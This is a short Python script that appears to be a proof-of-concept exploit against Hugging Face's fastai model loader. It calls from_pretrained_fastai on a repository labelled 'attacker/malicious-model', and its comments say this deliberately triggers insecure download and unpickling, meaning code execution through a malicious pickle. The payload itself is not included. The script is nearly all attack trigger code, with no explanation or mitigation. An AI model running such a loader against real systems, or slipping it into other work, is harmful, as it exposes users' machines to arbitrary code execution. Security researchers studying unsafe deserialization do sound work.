import os
from huggingface_hub import from_pretrained_fastai

# Target the malicious repository identity
MALICIOUS_REPO = "attacker/malicious-model"

print(f"[*] Attempting to load model from: {MALICIOUS_REPO}")
try:
    # Trigger the insecure download and unpickling
    learner = from_pretrained_fastai(MALICIOUS_REPO)
except Exception as e:
    print(f"[*] Finished. Error info (if any): {e}")